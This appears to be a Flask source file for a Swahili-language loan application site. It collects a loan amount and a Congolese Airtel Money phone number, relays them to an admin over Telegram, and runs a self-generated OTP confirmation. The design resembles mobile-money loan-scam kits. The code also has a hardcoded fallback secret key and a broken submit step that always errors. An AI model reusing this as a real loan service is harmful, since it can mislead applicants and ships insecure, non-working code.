from flask import Flask, request, render_template_string, session
import requests, os, random

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "random_secret_123")

TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_CHAT_ID = os.getenv("CHAT_ID")

CURRENT_OTP = {}
CURRENT_DATA = {}

# STEP 1: Loan Calculator
STEP1_HTML = """
<form action="/step2" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
<h2 style="text-align:center;color:#333;">Step 1: Loan Calculator</h2>
<label><b>Loan Amount $:</b></label><br>
<input name="amount" type="number" placeholder="5000" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
<label><b>Months:</b></label><br>
<input name="months" type="number" placeholder="12" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
<button style="width:100%;padding:12px;background:#28a745;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Proceed</button>
</form>
"""

# STEP 2: Purpose
STEP2_HTML = """
<form action="/step3" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
<h2 style="text-align:center;color:#333;">Step 2: Purpose</h2>
<label><b>Unataka pesa kwa ajili ya nini?</b></label><br>
<select name="purpose" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;">
<option value="">Chagua</option>
<option value="Biashara">Biashara</option>
<option value="Personal Loan">Personal Loan</option>
</select><br>
<button style="width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Proceed</button>
</form>
"""

# STEP 3: Airtel Money
STEP3_HTML = """
<form action="/submit" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
<h2 style="text-align:center;color:#333;">Step 3: Payment Details</h2>
<label><b>+243 Airtel Money Number:</b></label><br>
<input name="phone" placeholder="+2438xxxxxxx" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
<button style="width:100%;padding:12px;background:#dc3545;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Apply Now</button>
</form>
"""

def send_telegram(chat_id, text, keyboard=None):
    if not TOKEN: return
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if keyboard: payload["reply_markup"] = keyboard
    requests.post(url, json=payload, timeout=10)

@app.route('/')
def home():
    return render_template_string(STEP1_HTML)

@app.route('/step2', methods=['POST'])
def step2():
    session['amount'] = request.form['amount']
    session['months'] = request.form['months']
    return render_template_string(STEP2_HTML)

@app.route('/step3', methods=['POST'])
def step3():
    session['purpose'] = request.form['purpose']
    return render_template_string(STEP3_HTML)

@app.route('/submit', methods=['POST'])
def submit():
    user_id = request.args.get('user')
    if not user_id:
        return "<h3 style='text-align:center; color:red;margin-top:50px;'>Error: Fungua link kutoka kwa bot ya Telegram</h3>"

    data = {
        'amount': session.get('amount'),
        'months': session.get('months'),
        'purpose': session.get('purpose'),
        'phone': request.form['phone'],
        'user_chat_id': user_id
    }
    app_id = str(random.randint(10000, 99999))
    CURRENT_DATA[app_id] = data

    text = f"<b>🚨 New Loan Application #{app_id}</b>\n\n<b>Amount:</b> ${data['amount']} for {data['months']} months\n<b>Purpose:</b> {data['purpose']}\n<b>Phone:</b> {data['phone']}"
    keyboard = {"inline_keyboard": [
        [{"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
         {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}]
    ]}
    send_telegram(ADMIN_CHAT_ID, text, keyboard)
    return "<h3 style='text-align:center; color:orange;margin-top:50px;'>Application received. Subiri admin akubali.</h3>"

@app.route(f"/{TOKEN}", methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    print("Received:", update)

    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')

        if text == '/start':
            msg = f"Habari! Anza maombi hapa:\n{request.url_root}?user={chat_id}"
            send_telegram(chat_id, msg)

        # ANGALIA KAMA MTEJA ANAJIBU OTP
        for app_id, otp_data in list(CURRENT_OTP.items()):
            if str(otp_data.get('user_chat_id')) == str(chat_id) and otp_data.get('waiting') == True:
                user_otp = text
                if user_otp == otp_data['code']:
                    data = CURRENT_DATA.get(app_id, {})
                    send_telegram(ADMIN_CHAT_ID, f"<b>✅ LOAN APPROVED & OTP VERIFIED</b>\n\n<b>ID:</b> {app_id}\n<b>Phone:</b> {data.get('phone')}\n<b>Amount:</b> ${data.get('amount')}")
                    send_telegram(chat_id, "<b>Asante! Loan yako imekubaliwa.</b>")
                    CURRENT_OTP.pop(app_id)
                    CURRENT_DATA.pop(app_id)
                else:
                    send_telegram(chat_id, "<b>OTP sio sahihi. Jaribu tena.</b>")
                return "ok", 200

    if 'callback_query' in update:
        query = update['callback_query']
        data = query['data']
        app_id = data.split('_')[1]
        user_chat_id = CURRENT_DATA[app_id]['user_chat_id']

        if data.startswith('approve_'):
            otp = str(random.randint(1000, 9999))
            CURRENT_OTP[app_id] = {'code': otp, 'user_chat_id': user_chat_id, 'waiting': True}
            send_telegram(user_chat_id, f"<b>Admin amekubali maombi yako #{app_id}</b>\n\nWeka 4-digit OTP hapa chini ili kumaliza:\n<code>{otp}</code>")
            send_telegram(ADMIN_CHAT_ID, f"<b>🔑 OTP YA #{app_id}:</b> <code>{otp}</code>\nNimeshatuma kwa mteja.")
            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": query['id']})

        elif data.startswith('reject_'):
            send_telegram(user_chat_id, f"<b>Samahani maombi yako #{app_id} yamekataliwa.</b>")
            send_telegram(ADMIN_CHAT_ID, f"<b>❌ Application #{app_id} IMEKATAA</b>")
            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": query['id']})

    return "ok", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
